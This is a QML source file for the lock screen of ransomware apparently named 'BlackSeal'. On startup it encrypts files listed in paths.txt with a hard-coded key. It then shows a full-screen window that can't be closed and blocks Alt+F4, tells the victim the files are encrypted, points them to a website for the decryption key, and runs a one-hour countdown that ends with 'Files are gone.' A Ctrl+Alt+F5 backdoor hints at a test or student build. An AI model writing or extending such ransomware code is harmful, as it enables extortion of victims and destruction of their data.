import QtQuick 2.15
import QtQuick.Window 2.15
import QtQuick.Controls 2.15
import BlackSeal 1.0

ApplicationWindow {
    id: lockScreen
    visible: true
    width: Screen.width
    height: Screen.height
    visibility: "FullScreen"
    color: "#111"
    flags: Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint | Qt.CustomizeWindowHint
    Component.onCompleted:  Encryptor.encryptFromFile("paths.txt", "BlackSealKey")
    onClosing: {
        close.accepted = shouldClose
        statusText.text = "🛑 Nice try. This window can't be closed."
    }
    property bool shouldClose: false

    Rectangle {
        id: mainFrame
        anchors.fill: parent
        color: "#1a1a1a"
        visible: false
        focus: true
        Connections {
            target: Encryptor
            onEncryptionFinished: mainFrame.visible = true
        }
        Keys.onPressed: (event) => {
            const ALT = Qt.AltModifier
            const F5 = Qt.Key_F5
            const F4 = Qt.Key_F4
            const CTRL = Qt.ControlModifier

            console.log("Key:", event.key, "Alt:", event.altPressed, "Modifiers:", event.modifiers)
            if ((event.modifiers & ALT) && event.key === F4) {
                console.log("✅ Alt+F5 triggered.")
                statusText.text = "🛑 Nice try. This window can't be closed."
                lockScreen.shouldClose = false
                return
                //Qt.quit()
            }
            if ((event.modifiers & CTRL)&& ((event.modifiers & ALT))&& (event.key === F5)){
                console.log("CTRL pressed")
                statusText.text = "✅ Backdoor activated."
                lockScreen.shouldClose = true
                Qt.quit()
            }
        }
        Component.onCompleted: {
            mainFrame.forceActiveFocus()
        }

        Column {
            anchors.centerIn: parent
            spacing: 30

            Text {
                text: "🔒 Your files have been encrypted"
                font.pixelSize: 42
                color: "red"
                font.bold: true
                horizontalAlignment: Text.AlignHCenter
            }

            Text {
                text: "Enter the decryption key to unlock your data"
                font.pixelSize: 24
                color: "yellow"
                horizontalAlignment: Text.AlignHCenter
            }

            Text {
                text: "Visit this website on another device to obtain the Decryption Key:"
                font.pixelSize: 20
                color: "#aaa"
                horizontalAlignment: Text.AlignHCenter
            }
            UrlLoader {
                id: loader
            }

            Text {
                text: loader.loadUrl()
                font.pixelSize: 20
                color: "green"
                horizontalAlignment: Text.AlignHCenter
            }

            Timer {
                id: countdown
                interval: 1000; running: true; repeat: true
                property int secondsLeft: 3600 // 1 hour

                onTriggered: {
                    if (secondsLeft > 0) {
                        secondsLeft--
                        timerText.text = "⏳ Time left: " + Math.floor(secondsLeft / 60) + "m " + (secondsLeft % 60) + "s"
                    } else {
                        timerText.text = "💀 Time's up. Files are gone."
                        countdown.stop()
                    }
                }
            }

            Text {
                id: timerText
                font.pixelSize: 20
                color: "crimson"
                text: "⏳ Time left: Loading..."
                horizontalAlignment: Text.AlignHCenter
            }


            TextField {
                id: keyInput
                placeholderText: "Enter Key"
                echoMode: TextInput.Password
                width: 400
                font.pixelSize: 20
            }

            Button {
                text: "Decrypt"
                onClicked: {
                    ransomInterface.validateKey(keyInput.text)
                }
            }

            Text {
                id: statusText
                text: ""
                color: "orange"
                font.pixelSize: 18
            }
        }
    }

    RansomInterface {
        id: ransomInterface
        onUnlock: {
            statusText.text = "✔️ Key Accepted. Decrypting..."
            statusText.text = "✅ Unlock activated."
            lockScreen.shouldClose = true
            Qt.quit()
        }
        onInvalidKey: {
            statusText.text = "❌ Wrong Key. Try again."
        }
    }
}
